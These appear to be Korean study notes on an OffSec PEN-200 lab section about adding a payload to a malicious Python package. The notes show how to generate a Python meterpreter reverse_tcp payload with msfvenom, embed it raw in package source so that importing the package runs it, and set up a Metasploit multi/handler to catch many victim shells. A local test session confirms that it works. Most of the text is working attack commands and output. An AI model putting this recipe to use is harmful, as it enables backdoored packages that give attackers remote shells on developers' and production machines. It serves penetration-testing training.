# 26.9.5 페이로드 추가

> **Adding a Payload** · PEN-200 §26.9.5

페이로드는 meterpreter 로 감 — 이유가 둘임. ① 피벗에 쓸 기능이 갖춰져 있음 ② **셸이 몇 개 들어올지 모름.** 프로덕션 하나만 올 수도 있으나 하위 환경·개발자 랩톱까지 걸리면 여러 개가 동시에 들어옴. meterpreter 는 그 다중 세션을 받아낼 수 있음.

생성은 `msfvenom` 으로 함 — 패키지가 Python 이므로 `-p python/meterpreter/reverse_tcp`, 바이너리가 아니라 소스에 붙일 것이므로 `-f raw` 를 씀. `LHOST` 는 **모든 피해자가 도달할 수 있는 주소**여야 하므로 클라우드 Kali 인스턴스의 IP 를 쓰고, `LPORT` 는 임의로 4488 을 씀.

*Metasploit DB 초기화*

이어서 `msfconsole` 을 띄움. 페이로드를 직접 만들었으므로 범용 핸들러 `exploit/multi/handler` 를 씀.

```
kali@cloud-kali:~$ msfconsole
....
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4488
LPORT => 4488
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 0.0.0.0:4488
```

*다중 세션을 받도록 구성한 핸들러*

옵션 하나하나가 «여러 셸을 놓치지 않기» 위한 것임 —

- `set payload python/meterpreter/reverse_tcp` — 생성한 페이로드와 **정확히 일치**해야 스테이지가 붙음
- `LHOST 0.0.0.0` — 모든 인터페이스에서 대기. `LPORT` 는 페이로드에 박은 4488
- `ExitOnSession false` — 첫 세션이 붙자마자 리스너가 닫히는 기본 동작을 막음
- `run -jz` — `-j` 로 백그라운드 잡으로 돌리고, `-z` 로 붙은 세션에 **자동으로 들어가지 않게** 함. 셸이 쏟아질 때 콘솔이 잡히는 것을 막는 장치임

배포 전에 로컬에서 한 번 검증함 — 개인 Kali 로 돌아와 제거·재빌드·재설치한 뒤 `from hackshort_util import utils` 를 실행함.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
```

*재설치 후 임포트 — 임포트 그 자체가 페이로드 실행 시점임*

리스너 쪽을 확인함.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 233.252.50.125
[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
```

*스테이지가 전송되고 meterpreter 세션 1 이 열림*

확인용 세션은 `sessions -i <ID>` 로 들어가 `exit` 로 닫아둠. 진짜 대상에서 올라올 세션과 헷갈리지 않기 위함임.

```
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 233.252.50.125 - Meterpreter session 1 closed.  Reason: Died
```
